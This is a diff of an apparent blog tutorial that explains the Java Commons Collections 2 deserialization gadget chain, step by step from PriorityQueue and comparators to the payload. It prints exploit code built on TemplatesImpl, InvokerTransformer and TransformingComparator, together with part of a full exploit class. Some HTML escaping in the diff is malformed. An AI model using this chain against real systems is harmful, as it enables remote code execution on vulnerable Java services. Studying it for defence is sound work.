@@ -11,7 +11,8 @@ layout: default
 <p>So lets First Dive in and understand what is PriorityQueue and how does it works.</p>
 <p>
     <pre>
-import java.util.PriorityQueue;
+<code>
+    import java.util.PriorityQueue;
 
 public class SimplePriorityQueueDemo {
     public static void main(String[] args) {
@@ -26,6 +27,7 @@ public class SimplePriorityQueueDemo {
         }
     }
 }
+</code>
     </pre>
 </p>
 <p>
@@ -34,10 +36,12 @@ public class SimplePriorityQueueDemo {
 <p>Similarly in the priorityQueue Apart blank construcutors there are constructor that takes comparator and compares the numbers that are in the queue</p>
 <p>
     <pre>
-        AnotherClass ob=new AnotherClass()
-        PriorityQueue<String> pq = new PriorityQueue<String>(2,new ob);
-            pq.add("a");
-            pq.add("b")
+<code>
+    AnotherClass ob=new AnotherClass()
+    PriorityQueue<String> pq = new PriorityQueue<String>(2,new ob);
+        pq.add("a");
+        pq.add("b")
+</code>
     </pre>
 </p>
 <p>
@@ -45,7 +49,8 @@ public class SimplePriorityQueueDemo {
 </p>
 <p>
     <pre>
-import java.io.IOException;
+<code>
+    import java.io.IOException;
 import java.io.Serializable;
 import java.util.Comparator;
 
@@ -58,6 +63,7 @@ public class AnotherClass implements Comparator<String>, Serializable {
         }
     }
 }
+</code>
     </pre>
 </p>
 <p>So the priorituQueue will execute the Compare Method Writeen on the AnotherClass.java file and will obtain the ouput</p>
@@ -70,25 +76,27 @@ public class AnotherClass implements Comparator<String>, Serializable {
 </p>
 <p>
     <pre>
-        private void readObject(java.io.ObjectInputStream s)
-        throws java.io.IOException, ClassNotFoundException {
-        // Read in size, and any hidden stuff
-        s.defaultReadObject();
+<code>
+    private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+    // Read in size, and any hidden stuff
+    s.defaultReadObject();
 
-        // Read in (and discard) array length
-        s.readInt();
+    // Read in (and discard) array length
+    s.readInt();
 
-        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, size);
-        final Object[] es = queue = new Object[Math.max(size, 1)];
+    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, size);
+    final Object[] es = queue = new Object[Math.max(size, 1)];
 
-        // Read in all elements.
-        for (int i = 0, n = size; i < n; i++)
-            es[i] = s.readObject();
+    // Read in all elements.
+    for (int i = 0, n = size; i < n; i++)
+        es[i] = s.readObject();
 
-        // Elements are guaranteed to be in "proper order", but the
-        // spec has never explained what that might be.
-        heapify();
-    }
+    // Elements are guaranteed to be in "proper order", but the
+    // spec has never explained what that might be.
+    heapify();
+}
+</code>
     </pre>
 </p>
 <p>
@@ -100,27 +108,29 @@ public class AnotherClass implements Comparator<String>, Serializable {
 <p>Now Lets Jump into the Payload</p>
 <p>
     <pre>
-        public Queue<Object> getObject(final String command) throws Exception {
-            final Object templates = Gadgets.createTemplatesImpl(command);
-            // mock method name until armed
-            final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-    
-            // create queue with numbers and basic comparator
-            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
-            // stub data for replacement later
-            queue.add(1);
-            queue.add(1);
-    
-            // switch method called by comparator
-            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
-    
-            // switch contents of queue
-            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-            queueArray[0] = templates;
-            queueArray[1] = 1;
-    
-            return queue;
-        }
+<code>
+    public Queue&#60;Object&#62; getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
+        // mock method name until armed
+        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+
+        // create queue with numbers and basic comparator
+        final PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2,new TransformingComparator(transformer));
+        // stub data for replacement later
+        queue.add(1);
+        queue.add(1);
+
+        // switch method called by comparator
+        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+
+        // switch contents of queue
+        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+        queueArray[0] = templates;
+        queueArray[1] = 1;
+
+        return queue;
+    }
+</code>
     
     </pre>
 </p>
@@ -138,21 +148,23 @@ public class AnotherClass implements Comparator<String>, Serializable {
     <p>It calls the Transformer.apply(), This transformer is the same TransFormer That we have passed</p>
     <p>
         <pre>
-            public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
-                this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
-            }
-        
-            /**
-             * Constructs an instance with the given Transformer and Comparator.
-             *
-             * @param transformer  what will transform the arguments to {@code compare}
-             * @param decorated  the decorated Comparator
-             */
-            public TransformingComparator(final Transformer<? super I, ? extends O> transformer,
-                                          final Comparator<O> decorated) {
-                this.decorated = decorated;
-                this.transformer = transformer; 
-            }
+<code>
+    public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
+        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
+    }
+
+    /**
+     * Constructs an instance with the given Transformer and Comparator.
+     *
+     * @param transformer  what will transform the arguments to {@code compare}
+     * @param decorated  the decorated Comparator
+     */
+    public TransformingComparator(final Transformer<? super I, ? extends O> transformer,
+                                  final Comparator<O> decorated) {
+        this.decorated = decorated;
+        this.transformer = transformer; 
+    }
+</code>
         
         </pre>
     </p>
@@ -169,41 +181,46 @@ public class AnotherClass implements Comparator<String>, Serializable {
     <p>
         So the below code 
         <pre>
-            Transformer<String, Integer> transformer = new InvokerTransformer<>("length", null, null);
-            Integer length = transformer.transform("Hello");  // Calls transform() directly
-        </pre>
-        can also be written as 
-        <pre>
-            Function<String, Integer> func = transformer::transform;  // Adapts `Transformer` to `Function`
-            Integer length = func.apply("Hello");  // Calls transform() via apply()
+<code>
+    Transformer&#60;String, Integer&#62;transformer = new InvokerTransformer<>("length", null, null);
+    Integer length = transformer.transform("Hello");  // Calls transform() directly
+</code>
 
-        </pre>
+       <p> can also be written as</p>
+<code>
+    Function&#60;String, Integer&#62; func = transformer::transform;  // Adapts `Transformer` to `Function`
+    Integer length = func.apply("Hello");  // Calls transform() via apply()
+</code>
+
+</pre>
     </p>
     <p>If you check the SuperClass i.e TransFormer.java you will see the below code</p>
     <p>
         <pre>
-            public interface Transformer<T, R> extends Function<T, R> {
+<code>
+    public interface Transformer&#60;T, R&#62; extends Function&#60;T, R&#62;{
 
-                @Override
-                default R apply(final T t) {
-                    return transform(t);
-                }
-            
-                /**
-                 * Transforms the input object into some output object.
-                 * <p>
-                 * The input object SHOULD be left unchanged.
-                 * </p>
-                 *
-                 * @param input  the object to be transformed, should be left unchanged
-                 * @return a transformed object
-                 * @throws ClassCastException (runtime) if the input is the wrong class
-                 * @throws IllegalArgumentException (runtime) if the input is invalid
-                 * @throws FunctorException (runtime) if the transform cannot be completed
-                 */
-                R transform(T input);
-            
-            }
+        @Override
+        default R apply(final T t) {
+            return transform(t);
+        }
+    
+        /**
+         * Transforms the input object into some output object.
+         * <p>
+         * The input object SHOULD be left unchanged.
+         * </p>
+         *
+         * @param input  the object to be transformed, should be left unchanged
+         * @return a transformed object
+         * @throws ClassCastException (runtime) if the input is the wrong class
+         * @throws IllegalArgumentException (runtime) if the input is invalid
+         * @throws FunctorException (runtime) if the transform cannot be completed
+         */
+        R transform(T input);
+    
+    }
+</code>
         </pre>
     </p>
     <p>This is how the apply function gets converted to transform()</p>
@@ -231,7 +248,7 @@ public class AnotherClass implements Comparator<String>, Serializable {
 <p>
     <pre>
         InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
-        PriorityQueue<TemplatesImpl> priorityQueue = new PriorityQueue<TemplatesImpl>(2, new TransformingComparator(transformer));
+        PriorityQueue&#60;TemplatesImpl&#60; priorityQueue = new PriorityQueue&#60;TemplatesImpl&#60;(2, new TransformingComparator(transformer));
         priorityQueue.add(templates);
         priorityQueue.add(templates);
     </pre>
@@ -241,7 +258,8 @@ public class AnotherClass implements Comparator<String>, Serializable {
 </p>
 <p>
     <pre>
-        import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+        <code>
+            import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import java.lang.reflect.Field;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import javassist.ClassClassPath;
@@ -343,7 +361,7 @@ public class cc2 {
          */
          
         InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
-        PriorityQueue<TemplatesImpl> priorityQueue = new PriorityQueue<TemplatesImpl>(2, new TransformingComparator(transformer));
+        PriorityQueue&#60;TemplatesImpl&#60; priorityQueue = new PriorityQueue&#60;TemplatesImpl&#60;(2, new TransformingComparator(transformer));
         priorityQueue.add(templates);
         priorityQueue.add(templates);
         /*
@@ -356,6 +374,7 @@ public class cc2 {
         
     }
 }
+        </code>
     </pre>
 </p>
 <p>
